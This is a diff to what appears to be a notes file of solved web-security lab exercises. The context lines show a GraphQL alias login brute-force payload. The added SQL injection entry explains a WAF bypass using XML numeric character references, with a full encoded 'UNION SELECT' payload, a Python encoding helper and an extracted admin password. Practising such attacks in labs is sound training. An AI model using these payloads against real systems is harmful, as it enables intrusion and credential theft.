@@ -248,3 +248,12 @@ websocket, dom-xss, cache-poisoning, clickjacking
     - mutation{a0:login(input:{username:"carlos",password:"123456"}){token} a1:login(...) ...}
     - Found carlos password: 123456
     - Key: GraphQL aliases = unlimited operations per request
+
+### SQLi (15)
+56. SQL injection with filter bypass via XML encoding
+    - WAF blocks raw SQL keywords (UNION, SELECT, --)
+    - XML parser decodes numeric char references BEFORE SQL query
+    - Encode: &#49; = '1', &#32; = space, &#85; = 'U', etc.
+    - Full payload: &#49;&#32;&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84; = "1 UNION SELECT"
+    - Extracted admin password: qfq7k4hac92rkhi73ywo
+    - Helper: ''.join(f'&#{ord(c)};' for c in payload)
